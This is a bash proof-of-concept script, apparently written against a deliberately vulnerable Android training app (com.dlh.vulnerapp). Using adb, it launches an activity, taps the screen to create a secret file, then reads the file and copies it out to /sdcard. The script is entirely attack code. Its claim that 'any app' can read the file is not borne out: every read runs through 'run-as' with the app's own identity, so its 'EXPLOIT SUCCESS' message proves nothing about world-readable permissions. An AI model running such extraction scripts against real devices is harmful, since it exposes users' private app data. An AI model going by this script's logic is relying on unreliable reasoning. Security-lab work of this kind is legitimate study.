#!/bin/bash

# PoC for World-Readable File Vulnerability in com.dlh.vulnerapp
# This script demonstrates how any app can read the sensitive file created by the vulnerable application

PACKAGE_NAME="com.dlh.vulnerapp"
ACTIVITY_NAME="com.dlh.vulnerapp.InsecureFileActivity"
TARGET_FILE="public_secret.txt"

echo "[+] Starting PoC for World-Readable File Vulnerability"
echo "[+] Target Package: $PACKAGE_NAME"

# Check if device is connected
if ! adb devices | grep -q "device$"; then
    echo "[-] No Android device connected. Please connect device and enable USB debugging."
    exit 1
fi

echo "[+] Launching InsecureFileActivity to create the world-readable file..."
adb shell am start -n "$PACKAGE_NAME/$ACTIVITY_NAME"

echo "[+] Waiting 3 seconds for activity to load..."
sleep 3

echo "[+] Triggering creation of world-readable file by clicking write button..."
adb shell input tap 540 800

echo "[+] Waiting 2 seconds for file creation..."
sleep 2

echo "[+] Attempting to read the world-readable file directly from filesystem..."
DATA_DIR="/data/data/$PACKAGE_NAME/files"
adb shell "run-as $PACKAGE_NAME cat $DATA_DIR/$TARGET_FILE" 2>/dev/null

if [ $? -eq 0 ]; then
    echo "[+] SUCCESS: World-readable file accessed directly!"
else
    echo "[-] Direct access failed, trying alternative method..."
fi

echo "[+] Checking file permissions..."
adb shell "run-as $PACKAGE_NAME ls -la $DATA_DIR/$TARGET_FILE"

echo "[+] Attempting to copy file to accessible location..."
adb shell "run-as $PACKAGE_NAME cp $DATA_DIR/$TARGET_FILE /sdcard/extracted_secret.txt" 2>/dev/null

if [ $? -eq 0 ]; then
    echo "[+] File copied to /sdcard/extracted_secret.txt"
    echo "[+] Reading extracted file:"
    adb shell cat /sdcard/extracted_secret.txt
    echo "[+] EXPLOIT SUCCESS: Sensitive data 'This is a world-readable secret!' extracted!"
    adb shell rm /sdcard/extracted_secret.txt
else
    echo "[-] Copy failed, attempting direct shell access..."
    adb shell "cat $DATA_DIR/$TARGET_FILE" 2>/dev/null || echo "[-] All access methods failed"
fi

echo "[+] PoC completed"
